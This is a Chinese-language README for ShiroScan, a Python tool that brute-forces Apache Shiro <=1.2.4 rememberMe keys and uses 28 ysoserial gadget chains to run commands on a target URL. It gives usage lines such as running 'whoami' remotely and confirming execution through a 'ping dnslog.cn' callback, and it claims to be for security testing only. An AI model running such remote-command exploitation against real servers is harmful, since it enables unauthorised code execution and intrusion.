# ShiroScan
Shiro&lt;=1.2.4反序列化，一键检测工具

    改动内容：1.新增17个利用链模块,共28个利用链，预计增加成功率30%，已打包成新ysoserial的jar包，请勿更换
    改动内容：2.可直接获得目标使用key值
    改动内容：3.新增30个key(再多意义也不大)
    改动内容：4.输入命令自动进行bash编码，防止未了解此漏洞的人踩坑

```
共集成51个key进行fuzz
```

* 如果有帮助，请点个star哦，对应blog文章：http://www.svenbeast.com/post/tskRKJIPg/
* pip3 install -r requirments.txt   
* 若import模块错误，安装不成功，请到linux系统安装运行，或者去python库将crypto首字母改为大写并尝试pip install pycryptodome")

* Usage：python3 shiro.py  url  command
* Usage：python3 shiro.py  http://url.com  whoami

* http://www.dnslog.cn/   验证推荐使用这个dnslog平台，速度比ceye.io要快很多
* 执行的命令带空格记得用""引起来

* usage：python3 shiro.py  http://url.com  "ping dnslog.cn"
* 28个模块全部跑一遍,然后去dnslog平台查看是否收到请求，不出来就GG，也可能是因为目标使用的编码很冷门，可使用其他工具

* 请自行收集编码，在moule下的key.log中自行添加即可(格式: key:任意值)

## 不推荐当做exp使用，效率问题
## 仅供安全人员验证,测试是否存在此漏洞
